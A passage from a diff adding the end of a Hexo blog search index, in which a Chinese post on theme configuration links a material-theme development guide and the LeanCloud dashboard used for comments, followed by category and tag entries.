href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p>主页打不开很伤啊，我这里找到了<a href="https://neko-dev.github.io/material-theme-docs/#/start" target="_blank" rel="noopener">1.50版本的开发指南</a>，很详细，看完都能做出属于自己的主题页</p><p>评论系统使用<a href="https://leancloud.cn/dashboard/applist.html#/apps" target="_blank" rel="noopener">https://leancloud.cn/dashboard/applist.html#/apps</a> </p><h1 id="Good-luck"><a href="#Good-luck" class="headerlink" title="Good luck"></a>Good luck</h1>]]></content>
+    
+    
+    <categories>
+      
+      <category>博客</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>hexo</tag>
+      
+      <tag>github</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  
+</search>
